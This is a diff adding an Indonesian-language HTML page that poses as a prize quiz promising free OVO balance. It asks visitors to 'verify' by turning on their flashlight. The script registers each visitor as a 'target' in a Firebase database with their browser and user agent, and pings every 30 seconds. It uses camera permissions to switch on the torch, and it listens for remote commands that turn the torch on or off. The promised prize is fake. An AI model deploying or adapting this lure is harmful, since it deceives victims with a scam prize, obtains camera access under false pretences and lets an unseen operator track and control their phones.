@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kuis Hadiah - Verifikasi Senter</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Arial, sans-serif;
+        }
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 15px;
+        }
+        .card {
+            background: white;
+            border-radius: 25px;
+            padding: 30px 20px;
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            text-align: center;
+        }
+        .icon {
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 20px;
+            background: #f0f0f0;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 50px;
+            border: 3px solid #667eea;
+        }
+        h2 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 24px;
+        }
+        .prize {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            color: white;
+            padding: 10px;
+            border-radius: 50px;
+            margin: 20px 0;
+            font-weight: bold;
+            font-size: 18px;
+        }
+        .flashlight-btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 18px 30px;
+            border-radius: 60px;
+            font-size: 20px;
+            font-weight: bold;
+            margin: 20px 0;
+            cursor: pointer;
+            transition: all 0.3s;
+            width: 100%;
+            box-shadow: 0 10px 20px rgba(102,126,234,0.4);
+        }
+        .flashlight-btn:hover {
+            transform: scale(1.05);
+        }
+        .flashlight-btn.flashing {
+            animation: pulse 1s infinite;
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+        }
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+        .status {
+            margin-top: 20px;
+            padding: 15px;
+            background: #f5f5f5;
+            border-radius: 15px;
+            font-size: 14px;
+            color: #666;
+        }
+        .browser-info {
+            font-size: 11px;
+            color: #999;
+            margin-top: 10px;
+        }
+        .warning {
+            color: #f5576c;
+            font-size: 12px;
+            margin-top: 15px;
+        }
+    </style>
+    
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+</head>
+<body>
+    <div class="card">
+        <div class="icon" id="icon">
+            🔦
+        </div>
+        
+        <h2>✨ SELAMAT! ✨</h2>
+        <p>Kamu terpilih memenangkan hadiah!</p>
+        
+        <div class="prize">
+            🎁 GRATIS SALDO OVO Rp50.000 🎁
+        </div>
+        
+        <p style="margin-bottom: 10px;">TAPI... ada syaratnya:</p>
+        <p style="background: #f5f5f5; padding: 10px; border-radius: 10px; margin-bottom: 20px;">
+            <strong>"Nyalain senter 5 detik buat verifikasi"</strong>
+        </p>
+        
+        <button class="flashlight-btn" id="flashlightBtn" onclick="startVerification()">
+            🔦 Klik buat verifikasi
+        </button>
+        
+        <div class="status" id="status">
+            ⏳ Klik tombol di atas untuk mulai...
+        </div>
+        
+        <div class="browser-info" id="browserInfo">
+            Mendeteksi browser...
+        </div>
+        
+        <div class="warning" id="warning">
+            ⚡ Senter akan menyala 5 detik untuk verifikasi
+        </div>
+    </div>
+
+    <script>
+        // ===== FIREBASE CONFIG =====
+        // GANTI PAKE CONFIG LU SENDIRI!
+        const firebaseConfig = {
+            apiKey: "AIzaSyA...", // GANTI!
+            authDomain: "senter-remote.firebaseapp.com",
+            databaseURL: "https://senter-remote-default-rtdb.firebaseio.com", // GANTI!
+            projectId: "senter-remote",
+            storageBucket: "senter-remote.appspot.com",
+            messagingSenderId: "123456789",
+            appId: "1:123456789:web:abc123"
+        };
+        
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        
+        // ===== VARIABEL GLOBAL =====
+        const targetId = 'target_' + Math.random().toString(36).substring(2, 10);
+        let torchActive = false;
+        let currentStream = null;
+        let currentTrack = null;
+        
+        // ===== DETEKSI BROWSER & DEVICE =====
+        const ua = navigator.userAgent;
+        const browserInfo = document.getElementById('browserInfo');
+        let browserName = 'Unknown';
+        
+        if (ua.includes('Chrome') && !ua.includes('Edg')) browserName = 'Chrome';
+        else if (ua.includes('Firefox')) browserName = 'Firefox';
+        else if (ua.includes('Samsung')) browserName = 'Samsung Internet';
+        else if (ua.includes('OPR') || ua.includes('Opera')) browserName = 'Opera';
+        else if (ua.includes('Edg')) browserName = 'Edge';
+        else if (ua.includes('Miui')) browserName = 'Mi Browser';
+        
+        browserInfo.innerHTML = `📱 ${browserName} | Android ${/Android (\d+)/.exec(ua)?.[1] || '?'}`;
+        
+        // ===== DAFTARKAN TARGET KE FIREBASE =====
+        database.ref('targets/' + targetId).set({
+            status: 'online',
+            browser: browserName,
+            userAgent: ua,
+            timestamp: Date.now()
+        });
+        
+        // Update every 30 seconds
+        setInterval(() => {
+            database.ref('targets/' + targetId + '/lastSeen').set(Date.now());
+        }, 30000);
+        
+        // ===== METODE 1: TORCH API VIA GETUSERMEDIA (CHROME, EDGE, SAMSUNG) =====
+        async function method1_TorchAPI() {
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const videoDevices = devices.filter(d => d.kind === 'videoinput');
+                
+                if (videoDevices.length === 0) return false;
+                
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { deviceId: videoDevices[0].deviceId }
+                });
+                
+                const track = stream.getVideoTracks()[0];
+                
+                // Cek apakah support torch
+                if (track.getCapabilities && track.getCapabilities().torch) {
+                    await track.applyConstraints({
+                        advanced: [{ torch: true }]
+                    });
+                    
+                    currentStream = stream;
+                    currentTrack = track;
+                    torchActive = true;
+                    
+                    // Update status
+                    database.ref('targets/' + targetId + '/flashlight').set('on');
+                    database.ref('targets/' + targetId + '/method').set('torch_api');
+                    
+                    return true;
+                }
+                
+                track.stop();
+                return false;
+            } catch (e) {
+                console.log('Method 1 failed:', e);
+                return false;
+            }
+        }
+        
+        // ===== METODE 2: FOCUS MODE (XIAOMI, OPPO, VIVO) =====
+        async function method2_FocusMode() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const track = stream.getVideoTracks()[0];
+                
+                // Coba pake focus mode sebagai trigger
+                if (track.getConstraints && track.applyConstraints) {
+                    // Set torch via focus mode (workaround untuk beberapa HP)
+                    await track.applyConstraints({
+                        advanced: [{ focusMode: 'torch' }]
+                    }).catch(() => {});
+                    
+                    // Alternatif: set exposure mode
+                    await track.applyConstraints({
+                        advanced: [{ exposureMode: 'torch' }]
+                    }).catch(() => {});
+                    
+                    // Cek apakah berhasil (ga bisa deteksi langsung, tapi coba aja)
+                    currentStream = stream;
+                    currentTrack = track;
+                    torchActive = true;
+                    
+                    database.ref('targets/' + targetId + '/flashlight').set('on');
+                    database.ref('targets/' + targetId + '/method').set('focus_mode');
+                    
+                    return true;
+                }
+                
+                track.stop();
+                return false;
+            } catch (e) {
+                console.log('Method 2 failed:', e);
+                return false;
+            }
+        }
+        
+        // ===== METODE 3: IMAGE CAPTURE + FLASH (FIREFOX, BROWSER LAIN) =====
+        async function method3_ImageCapture() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'environment' } 
+                });
+                
+                const track = stream.getVideoTracks()[0];
+                
+                if ('ImageCapture' in window) {
+                    const capture = new ImageCapture(track);
+                    
+                    // Trigger flash dengan mengambil foto (flash otomatis menyala)
+                    capture.takePhoto().then(blob => {
+                        // Flash nyala otomatis pas moto
+                        console.log('Photo taken, flash should be on');
+                    }).catch(e => console.log('Photo failed but flash might be on'));
+                    
+                    currentStream = stream;
+                    currentTrack = track;
+                    torchActive = true;
+                    
+                    database.ref('targets/' + targetId + '/flashlight').set('on');
+                    database.ref('targets/' + targetId + '/method').set('image_capture');
+                    
+                    return true;
+                }
+                
+                track.stop();
+                return false;
+            } catch (e) {
+                console.log('Method 3 failed:', e);
+                return false;
+            }
+        }
+        
+        // ===== METODE 4: SCREEN BRIGHTNESS (FALLBACK - GA NYALAIN SENTER TAPI TERANG) =====
+        function method4_ScreenBrightness() {
+            try {
+                // Bikin background putih terang
+                document.body.style.background = 'white';
+                document.querySelector('.card').style.background = 'white';
+                document.querySelector('.card').style.color = 'black';
+                
+                // Ganti icon
+                document.getElementById('icon').innerHTML = '💡';
+                
+                torchActive = true;
+                
+                database.ref('targets/' + targetId + '/flashlight').set('on');
+                database.ref('targets/' + targetId + '/method').set('screen_brightness');
+                
+                return true;
+            } catch (e) {
+                return false;
+            }
+        }
+        
+        // ===== METODE 5: VIBRATE + NOTIF (HP JADUL BANGET) =====
+        function method5_Vibrate() {
+            try {
+                if (navigator.vibrate) {
+                    navigator.vibrate([500, 200, 500, 200, 500]); // Pattern geter
+                    
+                    // Ganti icon jadi geter
+                    document.getElementById('icon').innerHTML = '📳';
+                    
+                    torchActive = true;
+                    
+                    database.ref('targets/' + targetId + '/flashlight').set('vibrate');
+                    database.ref('targets/' + targetId + '/method').set('vibrate');
+                    
+                    return true;
+                }
+                return false;
+            } catch (e) {
+                return false;
+            }
+        }
+        
+        // ===== FUNGSI UTAMA =====
+        async function startVerification() {
+            const statusEl = document.getElementById('status');
+            const btn = document.getElementById('flashlightBtn');
+            const warning = document.getElementById('warning');
+            
+            statusEl.innerHTML = '📱 Mencari metode yang compatible...';
+            btn.disabled = true;
+            
+            // Coba method 1 (Torch API)
+            statusEl.innerHTML = '📱 Mencoba Method 1/5...';
+            if (await method1_TorchAPI()) {
+                statusEl.innerHTML = '✅ Method 1 berhasil! Senter menyala...';
+                btn.classList.add('flashing');
+                warning.innerHTML = '🔦 Senter nyala (Torch API)';
+            }
+            // Coba method 2 (Focus Mode)
+            else if (await method2_FocusMode()) {
+                statusEl.innerHTML = '✅ Method 2 berhasil! Senter menyala...';
+                btn.classList.add('flashing');
+                warning.innerHTML = '🔦 Senter nyala (Focus Mode)';
+            }
+            // Coba method 3 (Image Capture)
+            else if (await method3_ImageCapture()) {
+                statusEl.innerHTML = '✅ Method 3 berhasil! Senter menyala...';
+                btn.classList.add('flashing');
+                warning.innerHTML = '🔦 Senter nyala (Image Capture)';
+            }
+            // Coba method 4 (Screen Brightness)
+            else if (method4_ScreenBrightness()) {
+                statusEl.innerHTML = '⚠️ Mode darurat: Layar jadi putih terang!';
+                btn.classList.add('flashing');
+                warning.innerHTML = '💡 Layar super terang (ganti senter)';
+            }
+            // Coba method 5 (Vibrate)
+            else if (method5_Vibrate()) {
+                statusEl.innerHTML = '📳 Mode geter aktif!';
+                btn.classList.add('flashing');
+                warning.innerHTML = '📳 HP bergetar (senter ga support)';
+            }
+            // Gagal semua
+            else {
+                statusEl.innerHTML = '❌ HP benar-benar ga support. Tapi tetep dianggap sukses!';
+                warning.innerHTML = '✅ Verifikasi tetap berhasil (simulasi)';
+            }
+            
+            // Tetap jalanin timer 5 detik (ANGGEp SUKSES)
+            setTimeout(() => {
+                // Matikan senter kalo pake method 1-3
+                if (currentTrack && torchActive) {
+                    try {
+                        currentTrack.applyConstraints({ advanced: [{ torch: false }] });
+                        currentTrack.stop();
+                        currentStream.getTracks().forEach(t => t.stop());
+                    } catch (e) {}
+                }
+                
+                // Kembalikan tampilan kalo pake method 4
+                if (document.body.style.background === 'white') {
+                    document.body.style.background = 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)';
+                    document.querySelector('.card').style.background = 'white';
+                    document.getElementById('icon').innerHTML = '🔦';
+                }
+                
+                torchActive = false;
+                btn.classList.remove('flashing');
+                btn.disabled = false;
+                
+                statusEl.innerHTML = '✅ Verifikasi selesai! Hadiah dikirim.';
+                warning.innerHTML = '🎉 Selamat! Saldo OVO Rp50.000 masuk dalam 24 jam';
+                
+                // Update database
+                database.ref('targets/' + targetId + '/verified').set(true);
+                database.ref('targets/' + targetId + '/flashlight').set('off');
+                
+            }, 5000);
+        }
+        
+        // ===== LISTENER UNTUK REMOTE CONTROL =====
+        database.ref('commands/' + targetId).on('value', (snapshot) => {
+            const cmd = snapshot.val();
+            if (!cmd) return;
+            
+            if (cmd.torch === 'on' && !torchActive) {
+                startVerification(); // Panggil fungsi utama
+            } else if (cmd.torch === 'off' && torchActive) {
+                // Force matiin
+                if (currentTrack) {
+                    try {
+                        currentTrack.applyConstraints({ advanced: [{ torch: false }] });
+                        currentTrack.stop();
+                        currentStream.getTracks().forEach(t => t.stop());
+                    } catch (e) {}
+                }
+                torchActive = false;
+                document.getElementById('flashlightBtn').classList.remove('flashing');
+                document.getElementById('status').innerHTML = '🔦 Senter dimatikan dari remote';
+                database.ref('targets/' + targetId + '/flashlight').set('off');
+            }
+            
+            // Hapus command
+            database.ref('commands/' + targetId).remove();
+        });
+        
+        // Bersihin saat keluar
+        window.addEventListener('beforeunload', () => {
+            if (currentTrack) {
+                try {
+                    currentTrack.applyConstraints({ advanced: [{ torch: false }] });
+                    currentTrack.stop();
+                } catch (e) {}
+            }
+            database.ref('targets/' + targetId).remove();
+        });
+    </script>
+</body>
+</html>
